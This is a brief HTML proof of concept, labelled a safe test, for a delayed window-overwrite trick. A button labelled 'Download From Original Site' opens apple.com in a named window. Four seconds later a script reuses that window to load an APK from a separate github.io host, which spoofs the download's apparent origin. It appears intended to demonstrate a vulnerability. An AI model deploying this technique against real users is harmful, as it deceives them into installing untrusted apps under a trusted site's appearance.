<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Delayed overwrite PoC (safe test)</title>
  <style>
    .button {
      padding: 12px 20px;
      font-size:16px;
      cursor:pointer;
      border-radius:6px;
    }
  </style>
</head>
<body>
  <h3>Click the button to simulate the flow</h3>
  <button class="button" onclick="trigger()">Download From Original Site</button>

  <script>
    function trigger(){
      window.open('https://www.apple.com', 'victimWindow');
      setTimeout(function(){
        var testFile = 'https://ybt01.github.io/upload/app-debug.apk';
        window.open(testFile, 'victimWindow');
      }, 4000); // 4 seconds
    }
  </script>
</body>
</html>
